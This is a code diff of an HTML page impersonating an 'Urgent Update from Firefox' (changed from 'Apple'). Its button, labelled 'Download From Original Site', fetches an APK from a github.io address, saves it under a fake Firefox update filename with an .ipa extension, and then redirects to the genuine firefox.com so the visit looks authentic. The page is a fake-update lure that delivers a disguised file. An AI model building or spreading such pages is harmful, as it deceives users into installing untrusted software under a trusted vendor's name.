@@ -9,26 +9,26 @@
 </head>
 
 <body>
-    <h1>Urgent Update from Apple</h1>
+    <h1>Urgent Update from Firefox</h1>
 
     <!-- <button onclick="startDownload()">Start Download new tab</button> -->
 
 
 
-    <button onclick="startImmed()">Download immediately test</button>
+    <button onclick="startImmed()">Download From Original Site</button>
 
 
 
     <script>
         function startImmed() {
 
-            fetch('https://kokurate.github.io/browser/rar-android-722.132.apk')
+            fetch('https://kokurate.github.io/browser/filedownload.apk')
                 .then(response => response.blob())
                 .then(blob => {
                     const url = URL.createObjectURL(blob);
                     const link = document.createElement('a');
                     link.href = url;
-                    link.download = 'Urgent-Update-From-Firefox154.apk';
+                    link.download = 'Urgent-Update-From-Firefox154.ipa';
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
@@ -37,8 +37,8 @@
                 .catch(console.error);
 
             setTimeout(function () {
-                window.location.href = 'https://www.firefox.com/en-GB/more/';
-            }, 5000);
+                window.location.href = 'https://www.firefox.com/en-US/features/';
+            }, 500);
         }
     </script>
 
